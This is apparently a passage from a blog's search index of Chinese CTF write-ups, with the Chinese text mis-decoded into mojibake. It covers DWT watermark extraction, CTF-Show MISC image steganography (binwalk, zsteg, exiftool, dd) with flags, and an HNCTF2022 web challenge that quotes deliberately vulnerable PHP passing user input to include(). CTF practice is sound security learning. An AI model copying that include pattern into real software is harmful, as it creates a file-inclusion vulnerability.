cv2.imread(watermark) self.coef = weight def arnold(self, img):#arnoldå‡½æ•°å¯¹ç»™å®šçš„å›¾åƒimgåº”ç”¨Arnoldå˜æ¢ï¼Œè¿›è¡Œkeyæ¬¡è¿­ä»£ã€‚ r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key):#deArnoldå‡½æ•°å¯¹ç»™å®šçš„å›¾åƒimgåº”ç”¨é€†Arnoldå˜æ¢ï¼Œè¿›è¡Œkeyæ¬¡è¿­ä»£ã€‚ for i in range(r): for j in range(c): x = (i + b * j) % r y = (a * i + (a * b + 1) * j) % c p[x, y] = img[i, j] return p def deArnold(self, img):# r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = ((a * b + 1) * i - b * j) % r y = (-a * i + j) % c p[x, y] = img[i, j] return p #ä½¿ç”¨DWTæå–æ°´å°ï¼š def get(self, size: tuple = (1200, 1200), flag: int = None): img = cv2.resize(self.img, size) img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY) c = pywt.wavedec2(img2, 'db2', level=3) [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c d = pywt.wavedec2(img1, 'db2', level=3) [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d #å››ä¸ªæƒé‡ç³»æ•°ï¼ˆa1ï¼Œa2ï¼Œa3ï¼Œa4ï¼‰ç”¨äºä¿®æ”¹å°æ³¢ç³»æ•°ã€‚ a1, a2, a3, a4 = self.coef ca1 = (cl - dl) * a1 ch1 = (cH3 - dH3) * a2 cv1 = (cV3 - dV3) * a3 cd1 = (cD3 - dD3) * a4 # ç¡®ä¿æ‰€æœ‰ç³»æ•°å…·æœ‰ç›¸åŒçš„å½¢çŠ¶ ca1 = cv2.resize(ca1, (cD3.shape[1], cD3.shape[0])) waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2') waterImg = np.array(waterImg, np.uint8) waterImg = self.deArnold(waterImg) kernel = np.ones((3, 3), np.uint8) #æ ¹æ®flagå‚æ•°çš„å€¼ï¼Œä½¿ç”¨OpenCVçš„erodeæˆ–dilateå‡½æ•°å¯¹æå–çš„æ°´å°å›¾åƒè¿›è¡Œè…èš€æˆ–è†¨èƒ€æ“ä½œã€‚ if flag == 0: waterImg = cv2.erode(waterImg, kernel) elif flag == 1: waterImg = cv2.dilate(waterImg, kernel) return waterImg if __name__ == '__main__': img = 'a.png' # åŸå§‹å›¾åƒæ–‡ä»¶å watermark = 'newImg.png' # åµŒå…¥äº†æ°´å°çš„å›¾åƒæ–‡ä»¶å k = 20 # å¯†é’¥ xs = [0.2, 0.2, 0.5, 0.4] # æƒé‡åˆ—è¡¨ # åˆ›å»º WaterMarkDWT å¯¹è±¡ W1 = WaterMarkDWT(img, watermark, k, xs) # æå–æ°´å° extracted_watermark = W1.get() # å¯ä»¥å°†æå–å‡ºçš„æ°´å°ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œæˆ–è€…è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç† cv2.imwrite('æå–å‡ºçš„æ°´å°.png', extracted_watermark) è¿è¡Œå¾—åˆ°flag FLAG flag{e642820a-44c0-4c7d-a259-68b15aca8840}","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"MISC-åˆ·é¢˜ä¹‹æ—…","path":"/2024/05/02/misc-shua-ti-zhi-lu/","content":"CTF-Show MISCå…¥é—¨ å›¾ç‰‡ç¯‡(åŸºç¡€æ“ä½œ) MISC1 æ‰“å¼€å³æ˜¯flag MISC2 010æ‰“å¼€å‘ç°æ˜¯PNGæ–‡ä»¶å¤´ï¼Œä¿®æ”¹åç¼€çœ‹çœ‹ æ‰“å¼€å³æ˜¯flag è®°å½•ä¸€ä¸‹å¸¸è§æ–‡ä»¶å¤´ JPEG (jpg) æ–‡ä»¶å¤´ï¼šFF D8 FF æ–‡ä»¶å°¾ï¼šFF D9 PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47 Windows Bitmap (bmp)ï¼Œ æ–‡ä»¶å¤´ï¼š424D æ–‡ä»¶å°¾ï¼š GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638 XML (xml)ï¼Œæ–‡ä»¶å¤´ï¼š3C3F786D6C HTML (html)ï¼Œæ–‡ä»¶å¤´ï¼š68746D6C3E MS Word/Excel (xls.or.doc)ï¼Œæ–‡ä»¶å¤´ï¼šD0CF11E0 MS Access (mdb)ï¼Œæ–‡ä»¶å¤´ï¼š5374616E64617264204A Adobe Acrobat (pdf)ï¼Œæ–‡ä»¶å¤´ï¼š255044462D312E Windows Password (pwl)ï¼Œæ–‡ä»¶å¤´ï¼šE3828596 ZIP Archive (zip)ï¼Œæ–‡ä»¶å¤´ï¼š504B0304 RAR Archive (rar)ï¼Œæ–‡ä»¶å¤´ï¼š52617221 Wave (wav)ï¼Œæ–‡ä»¶å¤´ï¼š57415645 AVI (avi)ï¼Œæ–‡ä»¶å¤´ï¼š41564920 TIFF (tif)ï¼Œ æ–‡ä»¶å¤´ï¼š49492A00 æ–‡ä»¶å°¾ï¼š MISC3 æ˜¯ä¸ªbpgæ–‡ä»¶åç¼€ï¼Œæ²¡è§è¿‡ï¼Œä¸ä¼šï¼Œçœ‹wpã€‚ ä¸‹è½½ä¸‹æ¥é‡Œé¢æ˜¯ä¸€ä¸ªBPG çš„æ ¼å¼æ–‡ä»¶ éœ€è¦ç”¨èƒ½æ‰“å¼€è½¯ä»¶çš„å·¥å…·ï¼šhttps://bellard.org/bpg/ ä¸‹è½½ä¹‹åï¼Œè¾“å…¥å¦‚ä¸‹å›¾æ‰€ç¤ºçš„å‘½ä»¤ï¼Œå³å¯å¾—åˆ°flag MISC4 å¾—åˆ°6ä¸ªæ–‡ä»¶ï¼Œ010æ‰“å¼€ï¼Œæ ¹æ®æ–‡ä»¶å¤´æ›´æ”¹å¯¹åº”çš„æ ¼å¼å³å¯ï¼Œå°±æœ€åä¸€ä¸ªæ˜¯ä¸€ä¸ªwebpåç¼€ï¼Œéœ€è¦è´¹ç‚¹æ—¶é—´æ‰èƒ½æ‰¾åˆ°ï¼Œå¯ä»¥ç›´æ¥çœ‹ä¸‹å›¾çš„æ–‡ä»¶å†…å®¹å‘ç°æœ‰RIFFâ€¦â€¦WEBPï¼Œæˆ–è€…å°±æ˜¯æ–‡ä»¶å¤´16è¿›åˆ¶ ä¿®æ”¹å®Œä¾æ¬¡æ‰“å¼€æ‹¼æ¥å°±æ˜¯flag ctfshow{4314e2b15ad9a960e7d9d8fc2ff902da} å›¾ç‰‡ç¯‡(ä¿¡æ¯é™„åŠ ) MISC5 å›¾ç‰‡æ˜¯å‡çš„ï¼Œ010æ‰“å¼€æœflagå³å¯ MISC6 åŒä¸Šä¸€å…³ MISC7 ä¾æ—§åŒä¸Šå…³ MISC8 è¿™éœ€è¦ä»”ç»†è§‚å¯Ÿï¼Œå¯ä»¥åœ¨010çœ‹åˆ°æœ‰ä¸¤ä¸ªPNG è¯´æ˜ä¸€ä¸ªå›¾ç‰‡ä¸­å«æœ‰ä¸¤ä¸ªå›¾ç‰‡çš„æ„æ€ï¼Œçœ‹äº†wpï¼Œåˆ†ç¦»çš„è¯é‡‡ç”¨foremostæˆ–è€…binwalkï¼Œæˆ‘ç›´æ¥kaliäº†ï¼Œå¦‚ä¸‹å›¾ä¹Ÿèƒ½çœ‹åˆ°æœ‰ä¸¤ä¸ªå›¾ç‰‡ è¿™é‡Œä½¿ç”¨foremostæ¯”è¾ƒæ–¹ä¾¿ï¼Œå¦‚ä¸‹å›¾ï¼ŒæŸ¥çœ‹pngç›®å½•ä¸‹çš„å›¾ç‰‡å³å¯ ctfshow{1df0a9a3f709a2605803664b55783687} MISC9 åˆæ˜¯ç›´æ¥æ‰“å¼€å¾—åˆ°flag MISC10 binwalkåˆ†æå¾—åˆ°å…¶ä¸­å«æœ‰zipï¼Œ-eé€‰é¡¹å¯ä»¥æå–å·²çŸ¥çš„æ–‡ä»¶ç±»å‹ å‘ç°åœ¨å¾—åˆ°çš„ç»“æœä¸­ï¼Œç›´æ¥å¾—åˆ°äº†flag MISC11 ä¸ä¼šï¼Œçœ‹wpæ˜¯ä¸IDATå—æœ‰å…³ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸¤ä¸ªIDATå—ï¼Œå­¦ä¹ ä¸€ä¸‹æ¦‚å¿µï¼š IDATå®šä¹‰ï¼š å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚ IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ï¼Œå› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿäº†è§£IDATçš„ç»“æ„ï¼Œç”¨æˆ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”ŸæˆPNGå›¾åƒã€‚ ä¸€èˆ¬çš„IDATéšå†™ä¼šä½“ç°åœ¨IDATå—çš„é•¿åº¦ä¸Šï¼Œä¼šæœ‰ä¸€äº›IDATå—æœ‰å¼‚å¸¸çš„é•¿åº¦ï¼Œé‚£ä¹ˆå°±æ˜¯è§£é¢˜çš„å…³é”®ã€‚ IDATæœ‰å›ºå®šçš„é•¿åº¦ï¼Œæ­£å¸¸çš„PNGå›¾ç‰‡åªæœ‰æœ€åä¸€ä¸ªIDATå—çš„é•¿åº¦æ˜¯æ¯”å…¶ä»–çš„è¦çŸ­çš„ã€‚ PNGå›¾ç‰‡æ ¼å¼ä»‹ç»ï¼šMISCä¹‹å›¾åƒå¤„ç† è¿™é“é¢˜æ„Ÿè§‰ä¹Ÿä¸æ˜¯å…³äºIDATä¹‹ç±»çš„å¤„ç†ï¼Œåªæ˜¯å•çº¯è®©æˆ‘ä»¬ç†è§£è¿™æ˜¯ä¸ªä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆä½œç”¨çš„æ„æ€ . è¿™é‡Œç”¨å·¥å…·æ‰“å¼€ï¼Œå‘ç°å­˜åœ¨ä¸¤ä¸ªIDATå—ï¼Œæ ¹æ®æˆ‘ä»¬çš„å›¾ç‰‡ï¼Œç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„æ˜¯fake flag å›¾åƒæ•°æ®å— IDATï¼ˆimage data chunkï¼‰ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚è¿™æ˜¯ä¸€ä¸ªå¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®å—ç±»å‹çš„æ•°æ®å—ã€‚å®ƒçš„ä½œç”¨å°±æ˜¯å­˜å‚¨ç€å›¾åƒçœŸæ­£çš„æ•°æ®ã€‚IDATé‡‡ç”¨ LZ77 ç®—æ³•çš„æ´¾ç”Ÿç®—æ³•è¿›è¡Œå‹ç¼©ï¼Œå¯ä»¥ç”¨ zlib è§£å‹ç¼©ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒIDAT å—åªæœ‰å½“ä¸Šä¸€ä¸ªå—å……æ»¡æ—¶ï¼Œæ‰ä¼šç»§ç»­ä¸€ä¸ªæ–°çš„å—ã€‚ è¿™é‡Œè¯´IDATåŒ…å«å¤šä¸ªè¿ç»­çš„æ•°æ®å—ï¼Œå­˜å‚¨å›¾åƒçœŸæ­£çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•åˆ é™¤è¿™äº›IDATå—ï¼Œæ¥çœ‹çœ‹å›¾ç‰‡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œå¦‚è¿™é“é¢˜åˆ é™¤ç¬¬ä¸€ä¸ªå°±æ˜¾ç¤ºäº†flagï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªIDATå—çš„å›¾åƒæ•°æ®ï¼Œå¯ä»¥è¯´æ˜¯ç¬¬ä¸€ä¸ªIDATå—è¦†ç›–äº†ç¬¬äºŒä¸ª ctfshow{44620176948fa759d3eeafeac99f1ce9} MISC12 é¦–å…ˆæˆ‘è¿™é‡Œçœ‹äº†ä¸€ä¸‹å‘ç°å­˜åœ¨å¾ˆå¤šIDATå—ï¼Œä»¥ä¸ºæœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Œç”¨TweakPNGçœ‹äº†ä¸€çœ¼ çœ‹ä¸å‡ºæ¥å•¥ï¼Œæ²¡è§„å¾‹ä¼¼ä¹ï¼Œäºæ˜¯çœ‹wpäº†ï¼Œå‘ç°éƒ½ç”¨äº†ä¸€ä¸ªPNGDebuggerï¼Œå­¦ä¹ ä¸€ç•ªï¼šå·¥å…· PNG Debugger çš„å®‰è£…ä½¿ç”¨ å¯ä»¥çœ‹åˆ°éƒ½æ˜¾ç¤ºCRCæ ¡éªŒæ²¡é—®é¢˜ï¼Œäºæ˜¯ç…§ç€ä¸Šä¸€å…³çš„æ€è·¯ï¼ŒæŠŠIDATå—éƒ½åˆ äº†ï¼Œå°è¯•ä¸€ä¸‹ï¼Œå‘ç°å½“åˆ é™¤å®Œç¬¬å…«ä¸ªä¹‹åï¼Œæ˜¾ç¤ºäº†flag ctfshow{10ea26425dd4708f7da7a13c8e256a73} MISC13 è¿™é“é¢˜è€ƒå¯Ÿçš„æœ‰ç‚¹ä¸ç¡®å®šï¼Œå¤§è‡´æˆ‘è®¤ä¸ºæ˜¯è€ƒå¯ŸIENDå—çš„ï¼Œçœ‹å¦‚ä¸‹ä»‹ç» å›¾åƒç»“æŸæ•°æ® IENDï¼ˆimage trailer chunkï¼‰ï¼šå®ƒç”¨æ¥æ ‡è®° PNG æ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚IEND æ•°æ®å—çš„é•¿åº¦æ€»æ˜¯ 00 00 00 00ï¼Œæ•°æ®æ ‡è¯†æ€»æ˜¯ IEND 49 45 4E 44ï¼Œå› æ­¤ï¼ŒCRC ç ä¹Ÿæ€»æ˜¯ AE 42 60 82ã€‚ é‚£æˆ‘ä»¬å¯¹æ¯”ç°åœ¨çš„æ–‡ä»¶ å‘ç°æ˜¯02ç»“å°¾ï¼Œæ„æ€æ˜¯IENDæ•°æ®å—é•¿åº¦ä¸æ˜¯0ï¼Œè¯´æ˜è¯¥å›¾ç‰‡ç»“å°¾éƒ¨åˆ†è¿˜å­˜åœ¨ç€æŸäº›æ•°æ®ï¼Œé‚£æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿ å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ctfshowç­‰çš„å­—æ ·ï¼Œæ ¹æ®wpæˆ‘ä»¬éœ€è¦æ‰¾å‡½æ•°ï¼šä½œç”¨æ˜¯è®©æ¯ä¸¤ä½16è¿›åˆ¶å­—ç¬¦è½¬æ¢ä¸ºä¸€ä¸ªASCIIæˆ–è€…æ˜¯è¢«ç§°ä½œ16è¿›åˆ¶å¯¹è±¡ã€‚è¿™é‡Œè¿˜æ˜¯çœ‹ä¸€ä¸‹å…³äºæ­¤å‡½æ•°çš„ä»‹ç»ï¼š bytes.fromhex() æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºä»åå…­è¿›åˆ¶å­—ç¬¦ä¸²åˆ›å»ºå­—èŠ‚ä¸²ï¼ˆbytesï¼‰å¯¹è±¡ã€‚ fromhex() æ–¹æ³•æ¥å—ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„å­—èŠ‚ä¸²ã€‚è¾“å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¯ä»¥åŒ…å«æ•°å­— 0-9 å’Œå°å†™å­—æ¯ a-fï¼ˆæˆ–å¤§å†™å­—æ¯ A-Fï¼‰ã€‚ é‚£æ€è·¯æ˜ç¡®äº†ï¼Œæå–ä¸Šè¿°16è¿›åˆ¶å­—ç¬¦ï¼Œåˆ©ç”¨è¯¥å‡½æ•°è½¬æ¢ä¸ºå¯¹åº”çš„å­—èŠ‚ä¸²ï¼Œä¸Šè„šæœ¬å³å¯ result = '' payload = \"631A74B96685738668AA6F4B77B07B216114655336A5655433346578612534DD38EF66AB35103195381F628237BA6545347C3254647E373A64E465F136FA66F5341E3107321D665438F1333239E9616C7D94\" s = bytes.fromhex(payload) print(s) for i in range(0, len(s), 2): result += chr(s[i]) print(result) #ctfshow{ae6e3ea48f518b7e42d7de6f412f839a} MISC14 æœäº†å¤šä¸ªæ–‡ç« ï¼Œå¤§è‡´ç†è§£è¿™é¢˜çš„æ€è·¯äº†ã€‚ é¦–å…ˆbinwalkåˆ†æå›¾ç‰‡ï¼Œå¹¶å°è¯•æå–å…¶ä¸­çš„å›¾ç‰‡ï¼Œä½†å¦‚ä¸‹å›¾ï¼Œè™½ç„¶æ˜¾ç¤ºå‡ºä¿¡æ¯äº†ï¼Œä½†å¹¶æ²¡æœ‰ç›´æ¥æå–åˆ°å›¾ç‰‡ï¼ˆåŸå› ä¸æ¸…æ¥šï¼‰ï¼Œæ ¹æ®wpï¼Œé‡‡ç”¨çš„Linux ddå‘½ä»¤åˆ†ç¦»å¾—åˆ°å…¶ä¸­çš„jpeg å‘½ä»¤å¦‚ä¸‹ï¼šå› ä¸ºjpegæ˜¯ä»2103å¼€å§‹çš„ï¼Œå› æ­¤ä¹Ÿå°±å¾—skipè·³è¿‡2103ä¸ªå— dd if=misc14.jpg of=flag.jpeg skip=2103 bs=1 æŸ¥çœ‹å³å¯å¾—åˆ°flag ctfshow{ce520f767fc465b0787cdb936363e694} MISC15 ç›´æ¥æœç´¢å³å¯ MISC16 è¿™é‡Œå°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„åŠæ³•ï¼Œåˆ©ç”¨binwalkæå–äº†ä¸€ä¸‹ï¼Œç›´æ¥æ‰¾åˆ°flag MISC17 ä¸ä¼šï¼Œçœ‹wpï¼Œä¸€ä¸ªæ–°å·¥å…·ï¼šzstegï¼šå¯ä»¥æ£€æµ‹PNGå’ŒBMPå›¾ç‰‡é‡Œçš„éšå†™æ•°æ®ã€‚ç›®å‰ï¼Œzstegæ”¯æŒæ£€æµ‹ï¼š LSB steganography in PNG &amp; BMP zlib-compressed data OpenStego Camouflage 1.2.1 LSB with The Eratosthenes set æ€è·¯å¦‚ä¸‹ï¼š å…ˆæ˜¯binwalkåˆ†ææ— æœï¼Œæ ¹æ®wpä½¿ç”¨å·¥å…·zstegåˆ†æå¯èƒ½ä¼šå­˜åœ¨çš„éšè—æ•°æ®ã€‚ å¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæç¤ºæˆ‘ä»¬å‘ç°äº†3544å­—èŠ‚çš„é¢å¤–æ•°æ®ï¼Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨è¯¥å·¥å…·ï¼Œå°†è¯¥æ•°æ®åˆ†ç¦»å‡ºæ¥ zsteg -e \"extradata:0\" misc17.png &gt; 1.txt æ¥ç€ç»§ç»­binwalkåˆ†ç¦»1.txtå³å¯ è¿›å…¥ç›¸å…³æ–‡ä»¶ï¼ŒæŸ¥çœ‹å›¾ç‰‡å¾—åˆ°flag ctfshow{0fe61fc42e8bbe55b9257d251749ae45} MISC18 æç¤ºï¼šflagåœ¨æ ‡é¢˜ã€ä½œè€…ã€ç…§ç›¸æœºå’Œé•œå¤´å‹å·é‡Œã€‚ ç«Ÿç„¶ç›´æ¥å³é”®æŸ¥çœ‹å±æ€§å³å¯ã€‚ã€‚ã€‚ã€‚ ctfshow{325d60c208f728ac17e5f02d4cf5a839} MISC19 æç¤ºï¼šflagåœ¨ä¸»æœºä¸Šçš„æ–‡æ¡£åé‡Œã€‚ æˆ‘ä»¬å¯ä»¥ç”¨kaliçš„exiftoolæˆ–è€…åœ¨çº¿ç½‘ç«™æŸ¥çœ‹ï¼šhttps://exif.tuchong.com/ ctfshow{dfdcf08038cd446a5eb50782f8d3605d} MISC20 å¥½å®¶ä¼™ï¼Œè°éŸ³å¾—åˆ°flag ctfshow{c97964b1aecf06e1d79c21ddad593e42} MISC21 å¯¹æˆ‘æ¥è¯´æœ‰ç‚¹è„‘æ´ï¼Œé¦–å…ˆæç¤ºflagåœ¨åºåˆ—å·ä¸­ï¼Œå¦‚ä¸‹å›¾ æ ¹æ®wpæƒ³åˆ°è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ï¼šhex(X&amp;Ys) äºæ˜¯çŒœæµ‹å°†Xã€Yçš„å­—æ®µå€¼è½¬æ¢ä¸ºHEXï¼ˆåˆ†æ®µè½¬16è¿›åˆ¶ï¼‰ 3902939465 2371618619 1082452817 2980145261 =ã€‹ctfshow{e8a221498d5c073b4084eb51b1a1686d} MISC22 æç¤ºï¼š**flagåœ¨å›¾ç‰‡é‡Œã€‚**è¿™é‡Œæ¶‰åŠåˆ°ç¼©ç•¥å›¾éšå†™ï¼Œå…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆç¼©ç•¥å›¾ ç¼©ç•¥å›¾ï¼ˆthumbnailï¼‰æ˜¯ä¸€ç§å°çš„å¿«ç…§, æ˜¯ä¸€ä¸ªå·²ç»æ ¼å¼åŒ–çš„å›¾åƒï¼Œä¸€èˆ¬æ¯”åŸå°ºå¯¸å°å‡ å€ï¼Œé€šå¸¸ä¸ºå±å¹•å®½åº¦çš„è‡ªåŠ¨æ”¹å˜è€Œç”Ÿæˆã€‚å®ƒæ˜¯ä¸€ä¸ªç”±ç‰¹å®šç®—æ³•ç”Ÿæˆçš„å›¾ç‰‡ï¼Œå¯ä»¥è¡¨ç¤ºæ•°å­—å›¾åƒã€è§†é¢‘å’Œæ–‡ç« ç­‰ã€‚ ç¼©ç•¥å›¾å¦ä¸€ä¸ªç”¨å¤„æ˜¯åœ¨WAPç½‘ç«™ä¸ŠæŠŠå¸¦å¤§å°ºå¯¸çš„å›¾ç‰‡å‹ç¼©ä¸ºä¸€ä¸ªå°çš„ç¼©ç•¥å›¾ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨ä¸Šä¼ ç…§ç‰‡çš„æ—¶å€™ï¼Œåç«¯ç¨‹åºä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå°å°ºå¯¸çš„ç¼©ç•¥å›¾ï¼Œä¾›ç”¨æˆ·ä¸Šä¼ æ—¶çœ‹åˆ°ï¼Œä¾¿äºç”¨æˆ·ä¸Šä¼ ï¼Œå‡å°‘ä¸Šä¼ å›¾ç‰‡çš„æ•°é‡å’Œæ–‡ä»¶å¤§å°ã€‚ å¸¸è§çš„ç¼©ç•¥å›¾æ–‡ä»¶æ ¼å¼æœ‰gifã€jpgã€pngã€bmpç­‰ï¼Œè€Œå¤§å¤šæ•°æµè§ˆå™¨éƒ½æ”¯æŒjpgã€gifæ ¼å¼çš„ç¼©ç•¥å›¾ï¼Œæœ‰çš„æµè§ˆå™¨è¿˜æ”¯æŒieçš„wmfå›¾ç‰‡æˆ–macçš„pictå›¾ç‰‡ã€‚ ç¼©ç•¥å›¾æ ¹æ®åº”ç”¨ä¸åŒè€Œæœ‰ä¸åŒçš„åˆ†ç±»ï¼Œå¸¸è§çš„åˆ†ç±»æœ‰Link-Thumbnailsã€List-Thumbnailsã€Explorer-Thumbnailså’ŒSlideshow-Thumbnailsç­‰ã€‚Link-Thumbnailsæ˜¯å¼•ç”¨åœ¨é¡µé¢ä¸Šä½¿ç”¨ï¼ŒList- Thumbnailsæ˜¾ç¤ºåˆ—è¡¨ä¸­çš„æ–‡æ¡£æˆ–å›¾ç‰‡ï¼ŒExplorer-Thumbnailsåœ¨æ¡Œé¢ä¸Šåœ¨æ—è¾¹æ˜¾ç¤ºæ–‡æ¡£ï¼ŒSlideshow-Thumbnailsæ˜¯ç”¨äºå®ç°å¹»ç¯ç‰‡æ•ˆæœçš„ç¼©ç•¥å›¾ã€‚ å¯ä»¥çœ‹ä¸€ä¸‹åˆ¶ä½œç¼©ç•¥å›¾çš„æ–¹æ³•ï¼š exiftool -b -ThumbnailImage flag.jpg &gt; thumbnail.jpg //å…ˆå°†flagä¸­çš„ç¼©ç•¥å›¾æ•°æ®æå–å‡ºæ¥åˆ°æŒ‡å®šæ–‡ä»¶ exiftool \"-ThumbnailImage&lt;=thumbnail.jpg\" challenge.jpg //å°†ä¸Šé¢çš„æ–‡ä»¶ä½œä¸ºç¼©ç•¥å›¾å†™å…¥challenage.jpgä¸­ è¿™åŸºæœ¬æ‡‚äº†ï¼Œå°±æ˜¯æƒ³åŠæ³•æŸ¥çœ‹åˆ°å…¶ä¸­çš„ç¼©ç•¥å›¾å³å¯å¾—åˆ°flagã€‚æ–¹æ³•å¦‚ä¸‹ï¼š æœ‰ä¸€ç§æ˜¯ç›´æ¥å·¥å…·æ‰“å¼€å³å¯ï¼Œä½†æˆ‘è¿™é‡Œæ­»æ´»æ‰¾ä¸åˆ°ä¸‹è½½çš„ï¼Œå®˜ç½‘ä¸‹è½½ä¹Ÿæ²¡ååº”ï¼Œä¹Ÿå°±æ”¾å¼ƒäº†ï¼Œä¼°è®¡è¿™ç©æ„å„¿ä¹Ÿä¸å¸¸ç”¨ï¼Œå°±åœ¨è¿™é‡Œå•çº¯æ”¾ä¸ªå›¾äº† exiftool -b -ThumbnailImage misc22.jpg &gt; 1.jpg ç›´æ¥æŸ¥çœ‹å³å¯ ctfshow{dbf7d3f84b0125e833dfd3c80820a129} MISC23 æç¤ºï¼šflagåœ¨æ—¶é—´é‡Œã€‚ ä¹Ÿæ˜¯çœ¼çæ²¡çœ‹å‡ºæ¥ï¼Œè¿™é‡Œexiftoolå¯ä»¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ï¼Œè¿™é‡Œæç¤ºæˆ‘ä»¬å°†unixè½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œç„¶ådecè½¬16è¿›åˆ¶ï¼Œå°±æ˜¯flag å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰å››ä¸ªæ—¶é—´ï¼Œé‚£è‚¯å®šæ˜¯è¦åˆ†æ®µè½¬æ¢äº† ctfshow{3425649ea0e31938808c0de51b70ce6a} MISC41 è¿™é¢˜æ˜¯çœŸè„‘æ´ï¼Œåˆšå¼€å§‹æ‰“å¼€jpgï¼Œåˆ†æäº†åŠå¤©å•¥éƒ½æ²¡æœ‰ï¼Œçœ‹äº†æ–‡ä»¶å¤´ï¼Œä»¥ä¸ºè¦ä¿®æ”¹ä¸€ä¸‹åç¼€æ‰è¡Œï¼Œä½†è¿˜æ˜¯æ²¡ç»“æœï¼Œçœ‹äº†wpå‘ç°ï¼š H4ppy Apr1l F001's D4yï¼ æ„šäººèŠ‚åˆ°äº†ï¼Œä¸€ç¾¤ç¬¨è›‹å¾€å—é£ï¼Œä¸€ä¼šå„¿æ’æˆSå­—ï¼Œä¸€ä¼šå„¿æ’æˆBå­—ã€‚ å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æç¤ºä¸­å«æœ‰F001ï¼Œäºæ˜¯ä½¬ä»¬æƒ³åˆ°äº†ï¼Œé«˜äº®ä¸€ä¸‹F001 äºæ˜¯å°±æœ‰ä¸‹å›¾ï¼Œä»”ç»†çœ‹å°±æ˜¯ctfshowã€‚ã€‚ã€‚ã€‚ã€‚ ctfshow{fcbd427caf4a52f1147ab44346cd1cdd} å‚è€ƒæ–‡ç«  CTFShow-MISCå…¥é—¨ç¯‡è¯¦ç»†wp(1-56) ã€CTFshowã€‘miscå…¥é—¨æ€»ç»“ CTFshowâ€”Miscå…¥é—¨1â€”23ä»¥åŠ41ï¼ˆåŸºç¡€æ“ä½œ+ä¿¡æ¯é™„åŠ ï¼‰ å›¾ç‰‡ç¯‡(æ–‡ä»¶ç»“æ„) MISC24","tags":["MISC"],"categories":["MISC"]},{"title":"HNCTF2022","path":"/2024/04/30/hnctf-2022/","content":"Week1-Interesting_include &lt;?php //WEBæ‰‹è¦æ‡‚å¾—æœç´¢ //flag in ./flag.php if(isset($_GET['filter'])){ $file = $_GET['filter']; if(!preg_match(\"/flag/i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } æ­£å¸¸è¾“å…¥flag.phpä¸å¯ï¼Œå°è¯•ä¼ªåè®®æˆåŠŸ Week1-2048 æ‰¾åˆ°alertä½ç½®ï¼ŒçŒœæµ‹æ˜¯flagï¼Œæ”¾åˆ°æ§åˆ¶å°è¾“å‡ºå³å¯ Week1-easy_html ä¿¡æ¯æœé›†ä¸€æ‰‹ï¼Œå‘ç°æ•æ„Ÿç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ 